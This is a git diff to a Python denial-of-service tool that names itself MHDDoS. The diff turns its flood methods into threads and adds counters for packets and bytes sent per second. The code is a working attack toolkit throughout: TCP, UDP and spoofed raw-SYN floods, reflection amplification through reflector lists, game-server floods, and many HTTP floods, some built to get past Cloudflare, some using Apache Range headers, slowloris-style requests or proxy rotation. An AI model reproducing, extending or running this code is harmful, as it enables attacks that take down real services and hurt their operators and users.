@@ -3,16 +3,18 @@
 from contextlib import suppress
 from itertools import cycle
 from json import load
+from logging import getLogger, shutdown, basicConfig
 from math import trunc, log2
+from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from random import randint, choice as randchoice
 from socket import (IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, socket,
                     SOCK_DGRAM, SOCK_RAW, gethostname, gethostbyname)
 from ssl import SSLContext, create_default_context, CERT_NONE
-from sys import argv, exit
+from sys import argv, exit as _exit
 from threading import Thread, Event, Lock
-from time import sleep
+from time import sleep, time
 from typing import Set, List, Any, Tuple
 from urllib import parse
 
@@ -22,18 +24,26 @@ from cfscrape import create_scraper
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import process_iter, net_io_counters, virtual_memory, cpu_percent
-from requests import get, Session, exceptions
+from requests import get, Session, exceptions, Response
 from yarl import URL
-import time
 
-localIP = get('http://ip.42.pl/raw').text
-currentDir = Path(__file__).parent
-
+basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
+logger = getLogger("MHDDoS")
+logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 
-__version__ = "2.0 SNAPSHOT"
+__version__ = "2.1 SNAPSHOT"
+__dir__ = Path(__file__).parent
+__ip__ = get('http://ip.42.pl/raw').text
+
+
+def exit(*message):
+    if message:
+        logger.error(" ".join(message))
+    shutdown()
+    _exit(1)
 
 
 class Methods:
@@ -54,7 +64,28 @@ google_agents = ["Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/
                  "Googlebot/2.1 (+http://www.google.com/bot.html)",
                  "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"]
 
-requests_sent = 0
+
+class Counter(object):
+    def __init__(self, value=0):
+        self._value = RawValue('i', value)
+        self._lock = Lock()
+
+    def __iadd__(self, value):
+        with self._lock:
+            self._value.value += value
+        return self
+
+    def __int__(self):
+        return self._value.value
+
+    def set(self, value):
+        with self._lock:
+            self._value.value = value
+        return self
+
+
+requests_sent = Counter()
+bytes_sent = Counter()
 
 
 class Tools:
@@ -79,9 +110,16 @@ class Tools:
         else:
             return num
 
+    @staticmethod
+    def sizeOfRequest(res: Response) -> int:
+        size: int = len(res.request.method)
+        size += len(res.request.url)
+        size += len('\r\n'.join(f'{key}: {value}' for key, value in res.request.headers.items()))
+        return size
+
 
 # noinspection PyBroadException
-class Layer4:
+class Layer4(Thread):
     _method: str
     _target: Tuple[str, int]
     _ref: Any
@@ -92,6 +130,7 @@ class Layer4:
                  ref: List[str] = None,
                  method: str = "TCP",
                  synevent: Event = None):
+        super().__init__(daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
         self._ref = ref
@@ -99,16 +138,12 @@ class Layer4:
         self._target = target
         self._synevent = synevent
 
-        self.run()
-
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
         while self._synevent.is_set():
             with suppress(Exception):
                 while self._synevent.is_set():
-                    global requests_sent
-                    requests_sent = requests_sent + 1
                     self.SENT_FLOOD()
 
     def select(self, name):
@@ -144,66 +179,88 @@ class Layer4:
             self._amp_payloads = cycle(self._generate_amp())
 
     def TCP(self) -> None:
+        global bytes_sent, requests_sent
         try:
             with socket(AF_INET, SOCK_STREAM) as s:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
                 while s.send(randbytes(1024)):
-                    continue
+                    requests_sent += 1
+                    bytes_sent += 1024
         except Exception:
             s.close()
 
     def MINECRAFT(self) -> None:
+        global bytes_sent, requests_sent
+        payload = b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA'
         try:
             with socket(AF_INET, SOCK_STREAM) as s:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
 
-                s.send(b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA')
+                s.send(payload)
+                bytes_sent += len(payload)
 
                 while s.send(b'\x01'):
                     s.send(b'\x00')
+                    requests_sent += 2
+                    bytes_sent += 2
+
         except Exception:
             s.close()
 
     def UDP(self) -> None:
+        global bytes_sent, requests_sent
         try:
             with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(randbytes(1024), self._target):
-                    continue
+                    requests_sent += 1
+                    bytes_sent += 1024
+
         except Exception:
             s.close()
 
     def SYN(self) -> None:
+        global bytes_sent, requests_sent
+        payload = self._genrate_syn()
         try:
             with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-                while s.sendto(self._genrate_syn(), self._target):
-                    continue
+                while s.sendto(payload, self._target):
+                    requests_sent += 1
+                    bytes_sent += len(payload)
+
         except Exception:
             s.close()
 
     def AMP(self) -> None:
+        global bytes_sent, requests_sent
+        payload = next(self._amp_payloads)
         try:
             with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-                while s.sendto(*next(self._amp_payloads)):
-                    continue
+                while s.sendto(*payload):
+                    requests_sent += 1
+                    bytes_sent += len(payload[0])
+
         except Exception:
             s.close()
 
     def VSE(self) -> None:
+        global bytes_sent, requests_sent
+        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
+                   b'\x20\x51\x75\x65\x72\x79\x00')
         try:
             with socket(AF_INET, SOCK_DGRAM) as s:
-                while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-                                b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
-                    continue
+                while s.sendto(payload, self._target):
+                    requests_sent += 1
+                    bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
-        ip.set_ip_src(localIP)
+        ip.set_ip_src(__ip__)
         ip.set_ip_dst(self._target[0])
         tcp: TCP = TCP()
         tcp.set_SYN()
@@ -231,7 +288,7 @@ class Layer4:
 
 
 # noinspection PyBroadException
-class HttpFlood:
+class HttpFlood(Thread):
     _proxies: List[Proxy] = None
     _payload: str
     _defaultpayload: Any
@@ -248,6 +305,7 @@ class HttpFlood:
                  synevent: Event = None, useragents: Set[str] = None,
                  referers: Set[str] = None,
                  proxies: Set[Proxy] = None) -> None:
+        super().__init__(daemon=True)
         self.SENT_FLOOD = None
         self._synevent = synevent
         self._rpc = rpc
@@ -293,7 +351,6 @@ class HttpFlood:
                          'Sec-Gpc: 1\r\n'
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
-        self.run()
 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
@@ -301,8 +358,6 @@ class HttpFlood:
         while self._synevent.is_set():
             with suppress(Exception):
                 while self._synevent.is_set():
-                    global requests_sent
-                    requests_sent = requests_sent + 1
                     self.SENT_FLOOD()
 
     @property
@@ -356,6 +411,7 @@ class HttpFlood:
             else "REQUESTS"
 
     def POST(self) -> None:
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload(("Content-Length: 44\r\n"
                                                 "X-Requested-With: XMLHttpRequest\r\n"
                                                 "Content-Type: application/json\r\n\r\n"
@@ -364,11 +420,14 @@ class HttpFlood:
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def STRESS(self) -> None:
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload((f"Content-Length: 524\r\n"
                                                 "X-Requested-With: XMLHttpRequest\r\n"
                                                 "Content-Type: application/json\r\n\r\n"
@@ -377,11 +436,14 @@ class HttpFlood:
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def COOKIES(self) -> None:
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload("Cookie: _ga=GA%s;"
                                                " _gat=1;"
                                                " __cfduid=dc232334gwdsd23434542342342342475611928;"
@@ -391,20 +453,26 @@ class HttpFlood:
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def APACHE(self) -> None:
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def XMLRPC(self) -> None:
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload(("Content-Length: 345\r\n"
                                                 "X-Requested-With: XMLHttpRequest\r\n"
                                                 "Content-Type: application/xml\r\n\r\n"
@@ -418,122 +486,160 @@ class HttpFlood:
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def PPS(self) -> None:
+        global bytes_sent, requests_sent
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(self._defaultpayload)
+                    if s.send(self._defaultpayload):
+                        requests_sent += 1
+                        bytes_sent += len(self._defaultpayload)
         except Exception:
             s.close()
 
     def GET(self) -> None:
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def BOT(self) -> None:
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload()
+        p1, p2 = str.encode(
+            "GET /robots.txt HTTP/1.1\r\n"
+            "Host: %s\r\n" % self._target.raw_authority +
+            "Connection: Keep-Alive\r\n"
+            "Accept: text/plain,text/html,*/*\r\n"
+            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "Accept-Encoding: gzip,deflate,br\r\n\r\n"
+        ), str.encode(
+            "GET /sitemap.xml HTTP/1.1\r\n"
+            "Host: %s\r\n" % self._target.raw_authority +
+            "Connection: Keep-Alive\r\n"
+            "Accept: */*\r\n"
+            "From: googlebot(at)googlebot.com\r\n"
+            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "Accept-Encoding: gzip,deflate,br\r\n"
+            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4)) +
+            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
+        )
         try:
             with self.open_connection() as s:
-                s.send(str.encode(
-                    "GET /robots.txt HTTP/1.1\r\n"
-                    "Host: %s\r\n" % self._target.raw_authority +
-                    "Connection: Keep-Alive\r\n"
-                    "Accept: text/plain,text/html,*/*\r\n"
-                    "User-Agent: %s\r\n" % randchoice(google_agents) +
-                    "Accept-Encoding: gzip,deflate,br\r\n\r\n"
-                ))
-                s.send(str.encode(
-                    "GET /sitemap.xml HTTP/1.1\r\n"
-                    "Host: %s\r\n" % self._target.raw_authority +
-                    "Connection: Keep-Alive\r\n"
-                    "Accept: */*\r\n"
-                    "From: googlebot(at)googlebot.com\r\n"
-                    "User-Agent: %s\r\n" % randchoice(google_agents) +
-                    "Accept-Encoding: gzip,deflate,br\r\n"
-                    "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4)) +
-                    "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
-                ))
+                s.send(p1)
+                s.send(p2)
+                bytes_sent += len(p1 + p2)
+                requests_sent += 2
+
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def EVEN(self) -> None:
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 while s.send(payload) and s.recv(1):
-                    continue
+                    requests_sent += 1
+                    bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def OVH(self) -> None:
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 for _ in range(min(self._rpc, 5)):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def CFB(self):
         pro = None
+        global bytes_sent, requests_sent
         if self._proxies:
             pro = randchoice(self._proxies)
         try:
             with create_scraper() as s:
                 for _ in range(self._rpc):
                     if pro:
-                        s.get(self._target.human_repr(), proxies=pro.asRequest())
-                        continue
+                        with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
+                            requests_sent += 1
+                            bytes_sent += Tools.sizeOfRequest(res)
+                            continue
 
-                    s.get(self._target.human_repr())
+                    with s.get(self._target.human_repr()) as res:
+                        requests_sent += 1
+                        bytes_sent += Tools.sizeOfRequest(res)
         except Exception:
             s.close()
 
     def CFBUAM(self):
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 sleep(5.01)
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def AVB(self):
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def DGB(self):
-        try:
-            with create_scraper() as s:
+        global bytes_sent, requests_sent
+        with create_scraper() as s:
+            try:
                 for _ in range(min(self._rpc, 5)):
                     sleep(min(self._rpc, 5) / 100)
                     if self._proxies:
                         pro = randchoice(self._proxies)
-                        s.get(self._target.human_repr(), proxies=pro.asRequest())
-                        continue
-                    s.get(self._target.human_repr())
-        except Exception:
-            s.close()
+                        with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
+                            requests_sent += 1
+                            bytes_sent += Tools.sizeOfRequest(res)
+                            continue
+
+                    with s.get(self._target.human_repr()) as res:
+                        requests_sent += 1
+                        bytes_sent += Tools.sizeOfRequest(res)
+            except Exception:
+                s.close()
 
     def DYN(self):
+        global bytes_sent, requests_sent
         payload: str | bytes = self._payload
         payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority)
         payload += self.randHeadercontent
@@ -542,11 +648,34 @@ class HttpFlood:
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
+        except Exception:
+            s.close()
+
+    def BYPASS(self):
+        global requests_sent, bytes_sent
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        try:
+            with Session() as s:
+                for _ in range(self._rpc):
+                    if pro:
+                        with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
+                            requests_sent += 1
+                            bytes_sent += Tools.sizeOfRequest(res)
+                            continue
+
+                    with s.get(self._target.human_repr()) as res:
+                        requests_sent += 1
+                        bytes_sent += Tools.sizeOfRequest(res)
         except Exception:
             s.close()
 
     def GSB(self):
+        global bytes_sent, requests_sent
         payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type, self._target.raw_path_qs, ProxyTools.Random.rand_str(6))
         payload = (payload +
                    'Accept-Encoding: gzip, deflate, br\r\n'
@@ -567,11 +696,14 @@ class HttpFlood:
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def NULL(self) -> None:
+        global bytes_sent, requests_sent
         payload: str | bytes = self._payload
         payload += "Host: %s\r\n" % self._target.authority
         payload += "User-Agent: null\r\n"
@@ -581,11 +713,14 @@ class HttpFlood:
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
-                    s.send(payload)
+                    if s.send(payload):
+                        requests_sent += 1
+                        bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def SLOW(self):
+        global bytes_sent, requests_sent
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
@@ -593,8 +728,11 @@ class HttpFlood:
                     s.send(payload)
                 while s.send(payload) and s.recv(1):
                     for i in range(self._rpc):
-                        s.send(str.encode("X-a: %d\r\n" % randint(1, 5000)))
-                        sleep(self._rpc / 15)
+                        keep = str.encode("X-a: %d\r\n" % randint(1, 5000))
+                        if s.send(keep):
+                            sleep(self._rpc / 15)
+                            requests_sent += 1
+                            bytes_sent += len(keep)
                     break
         except Exception:
             s.close()
@@ -621,21 +759,6 @@ class HttpFlood:
             self._defaultpayload = (self._defaultpayload + "Host: %s\r\n\r\n" % self._target.authority).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
 
-    def BYPASS(self):
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-        try:
-            with Session() as s:
-                for _ in range(self._rpc):
-                    if pro:
-                        s.get(self._target.human_repr(), proxies=pro.asRequest())
-                        continue
-
-                    s.get(self._target.human_repr())
-        except Exception:
-            s.close()
-
 
 class ProxyManager:
     @staticmethod
@@ -644,7 +767,7 @@ class ProxyManager:
         lock = Lock()
         for provider in cf["proxy-providers"]:
             if provider["type"] != Proxy_type and Proxy_type != 0: continue
-            print("Downloading Proxies form %s" % provider["url"])
+            logger.info("Downloading Proxies form %s" % provider["url"])
             ProxyManager.download(provider, proxes, lock, ProxyType.stringToProxyType(str(provider["type"])))
         return proxes
 
@@ -657,7 +780,7 @@ class ProxyManager:
                     with threadLock:
                         proxes.add(proxy)
             except Exception as e:
-                print('download proxy error', e)
+                logger.info('Download Proxy Error: %s' % (e.__str__() or e.__repr__()))
 
 
 class ToolsConsole:
@@ -714,22 +837,22 @@ class ToolsConsole:
 
                         t = [(last - now) for now, last in zip(od, ld)]
 
-                        print(("Bytes Sended %s\n"
-                               "Bytes Recived %s\n"
-                               "Packets Sended %s\n"
-                               "Packets Recived %s\n"
-                               "ErrIn %s\n"
-                               "ErrOut %s\n"
-                               "DropIn %s\n"
-                               "DropOut %s\n"
-                               "Cpu Usage %s\n"
-                               "Memory %s\n") % (Tools.humanbytes(t[0]),
-                                                 Tools.humanbytes(t[1]),
-                                                 Tools.humanformat(t[2]),
-                                                 Tools.humanformat(t[3]),
-                                                 t[4], t[5], t[6], t[7],
-                                                 str(cpu_percent()) + "%",
-                                                 str(virtual_memory().percent) + "%"))
+                        logger.info(("Bytes Sended %s\n"
+                                     "Bytes Recived %s\n"
+                                     "Packets Sended %s\n"
+                                     "Packets Recived %s\n"
+                                     "ErrIn %s\n"
+                                     "ErrOut %s\n"
+                                     "DropIn %s\n"
+                                     "DropOut %s\n"
+                                     "Cpu Usage %s\n"
+                                     "Memory %s\n") % (Tools.humanbytes(t[0]),
+                                                       Tools.humanbytes(t[1]),
+                                                       Tools.humanformat(t[2]),
+                                                       Tools.humanformat(t[3]),
+                                                       t[4], t[5], t[6], t[7],
+                                                       str(cpu_percent()) + "%",
+                                                       str(virtual_memory().percent) + "%"))
             if cmd in ["CFIP", "DNS"]:
                 print("Soon")
                 continue
@@ -785,16 +908,16 @@ class ToolsConsole:
                         print("Error!")
                         continue
 
-                    print(("Country: %s\n"
-                           "City: %s\n"
-                           "Org: %s\n"
-                           "Isp: %s\n"
-                           "Region: %s\n"
-                           ) % (info["country"],
-                                info["city"],
-                                info["org"],
-                                info["isp"],
-                                info["region"]))
+                    logger.info(("Country: %s\n"
+                                 "City: %s\n"
+                                 "Org: %s\n"
+                                 "Isp: %s\n"
+                                 "Region: %s\n"
+                                 ) % (info["country"],
+                                      info["city"],
+                                      info["org"],
+                                      info["isp"],
+                                      info["region"]))
 
             if cmd == "PING":
                 while True:
@@ -816,15 +939,15 @@ class ToolsConsole:
 
                     print('please wait ...', end="\r")
                     r = ping(domain, count=5, interval=0.2)
-                    print(('Address: %s\n'
-                           'Ping: %d\n'
-                           'Aceepted Packets: %d/%d\n'
-                           'status: %s\n'
-                           ) % (r.address,
-                                r.avg_rtt,
-                                r.packets_received,
-                                r.packets_sent,
-                                "ONLINE" if r.is_alive else "OFFLINE"))
+                    logger.info(('Address: %s\n'
+                                 'Ping: %d\n'
+                                 'Aceepted Packets: %d/%d\n'
+                                 'status: %s\n'
+                                 ) % (r.address,
+                                      r.avg_rtt,
+                                      r.packets_received,
+                                      r.packets_sent,
+                                      "ONLINE" if r.is_alive else "OFFLINE"))
 
     @staticmethod
     def stop():
@@ -887,7 +1010,7 @@ class ToolsConsole:
 
 
 if __name__ == '__main__':
-    with open(currentDir / "config.json") as f:
+    with open(__dir__ / "config.json") as f:
         con = load(f)
         with suppress(KeyboardInterrupt):
             with suppress(IndexError):
@@ -902,6 +1025,7 @@ if __name__ == '__main__':
                 url = None
                 event = Event()
                 event.clear()
+                target = None
 
                 if method not in Methods.ALL_METHODS:
                     exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
@@ -914,15 +1038,18 @@ if __name__ == '__main__':
                     try:
                         host = gethostbyname(url.host)
                     except Exception as e:
-                        print('cant get host by name', url.host, e)
+                        exit('Cannot resolve hostname ', url.host, e)
                     threads = int(argv[4])
                     rpc = int(argv[6])
                     timer = int(argv[7])
                     proxy_ty = int(argv[3].strip())
-                    proxy_li = Path(currentDir / "files/proxies/" / argv[5].strip())
-                    useragent_li = Path(currentDir / "files/useragent.txt")
-                    referers_li = Path(currentDir / "files/referers.txt")
+                    proxy_li = Path(__dir__ / "files/proxies/" / argv[5].strip())
+                    useragent_li = Path(__dir__ / "files/useragent.txt")
+                    referers_li = Path(__dir__ / "files/referers.txt")
                     proxies: Any = set()
+
+                    if len(argv) == 9:
+                        logger.setLevel("DEBUG")
 
                     if not useragent_li.exists(): exit("The Useragent file doesn't exist ")
                     if not referers_li.exists(): exit("The Referer file doesn't exist ")
@@ -934,20 +1061,19 @@ if __name__ == '__main__':
                     if not referers: exit("Empty Referer File ")
 
                     if proxy_ty not in {4, 5, 1, 0}: exit("Socks Type Not Found [4, 5, 1, 0]")
-                    if threads > 1000: print("WARNING! thread is higher than 1000")
-                    if rpc > 100: print("WARNING! RPC (Request Pre Connection) is higher than 100")
+                    if threads > 1000: logger.warning("thread is higher than 1000")
+                    if rpc > 100: logger.warning("RPC (Request Pre Connection) is higher than 100")
 
                     if not proxy_li.exists():
-                        if rpc > 100: print("WARNING! The file doesn't exist, creating files and downloading proxies.")
+                        if rpc > 100: logger.warning("The file doesn't exist, creating files and downloading proxies.")
                         proxy_li.parent.mkdir(parents=True, exist_ok=True)
                         with proxy_li.open("w") as wr:
                             Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
-                            print(f"{len(Proxies):,} Proxies are getting checked, this may take awhile !")
+                            logger.info(f"{len(Proxies):,} Proxies are getting checked, this may take awhile !")
                             Proxies = ProxyChecker.checkAll(Proxies, url.human_repr(), 1, threads)
-                            if not Proxies:
-                                exit(
-                                    "Proxy Check failed, Your network may be the problem | The target may not be"
-                                    " available.")
+                            if not Proxies: exit(
+                                "Proxy Check failed, Your network may be the problem | The target may not be"
+                                " available.")
                             stringBuilder = ""
                             for proxy in Proxies:
                                 stringBuilder += (proxy.__str__() + "\n")
@@ -955,13 +1081,12 @@ if __name__ == '__main__':
 
                     proxies = ProxyUtiles.readFromFile(proxy_li)
                     if not proxies:
-                        print("Empty Proxy File, Running flood witout proxy")
+                        logger.info("Empty Proxy File, Running flood witout proxy")
                         proxies = None
                     if proxies:
-                        print(f"Proxy Count: {len(proxies):,}")
+                        logger.info(f"Proxy Count: {len(proxies):,}")
                     for _ in range(threads):
-                        Thread(target=HttpFlood, args=(url, host, method, rpc, event, uagents, referers, proxies,),
-                               daemon=True).start()
+                        HttpFlood(url, host, method, rpc, event, uagents, referers, proxies).start()
 
                 if method in Methods.LAYER4_METHODS:
                     target = argv[2].strip()
@@ -972,34 +1097,43 @@ if __name__ == '__main__':
                     ref = None
 
                     if ":" not in target:
-                        print("WARNING! Port Not Selected, Set To Default: 80")
+                        logger.warning("Port Not Selected, Set To Default: 80")
                     else:
                         target = target.split(":")[0]
 
                     if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
                     if not ProxyTools.Patterns.IP.match(target): exit("Invalid Ip Selected")
-
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                             not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket ")
 
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
+                        if len(argv) == 7:
+                            logger.setLevel("DEBUG")
                         if len(argv) == 6:
-                            refl_li = Path(currentDir / "files" / argv[5].strip())
+                            refl_li = Path(__dir__ / "files" / argv[5].strip())
                             if not refl_li.exists(): exit("The Reflector file doesn't exist ")
                             ref = set(a.strip() for a in ProxyTools.Patterns.IP.findall(refl_li.open("r+").read()))
                         if not ref: exit("Empty Reflector File ")
+                    else:
+                        if len(argv) == 6:
+                            logger.setLevel("DEBUG")
 
                     for _ in range(threads):
-                        Thread(target=Layer4, args=((target, port), ref, method, event,), daemon=True).start()
+                        Layer4((target, port), ref, method, event).start()
 
-                print("Attack Started !")
+                logger.info("Attack Started to %s with %s method for %s seconds, threads: %d!" %
+                            (target or url.human_repr(), method, timer, threads))
                 event.set()
-                ts = time.time()
-                while time.time() < ts + timer:
-                    print('Attacking ' + ((str(host) + ':' + str(url.port or 80)) if host and url else str(argv[2])) + ' with ' + one + ' method')
-                    print('Requests sent: ' + str(requests_sent))
-                    print(str(round((time.time() - ts) / timer * 100, 2)) + '%')
+                ts = time()
+                while time() < ts + timer:
+                    logger.debug('PPS: %s, BPS: %s / %d%%' % (Tools.humanformat(int(requests_sent)),
+                                                              Tools.humanbytes(int(bytes_sent)),
+                                                              round((time() - ts) / timer * 100, 2)))
+                    requests_sent.set(0)
+                    bytes_sent.set(0)
                     sleep(1)
+
                 event.clear()
                 exit()
+
             ToolsConsole.usage()
